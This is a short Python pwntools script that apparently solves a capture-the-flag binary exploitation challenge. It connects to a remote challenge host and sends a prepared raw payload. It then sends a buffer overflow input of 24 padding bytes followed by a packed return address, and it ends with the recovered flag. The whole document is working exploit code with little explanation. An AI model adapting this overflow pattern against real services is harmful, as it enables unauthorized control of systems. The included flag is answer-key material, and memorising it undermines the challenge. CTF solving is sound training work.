
# Kernel < 5.8
# https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=122306117afe4ba202b5e57c61dfbeffc5c41387


from pwn import *

with open('chall.raw', 'rb') as f:
    s = f.read()

f.close()

# r = process('./chall')
r = remote('chall.nitdgplug.org', 30104)

# gdb.attach(r, """
#     b main
#     b *0x401356
# """)

r.recvline()
r.sendline(s)
r.recvline()

p = b'A' * 24
p += p64(0x4040A0)

r.sendline(p)

print('\n',r.recv().decode())

# GLUG{0p3n_wr1t3_r34d_6894bf818e81f42c}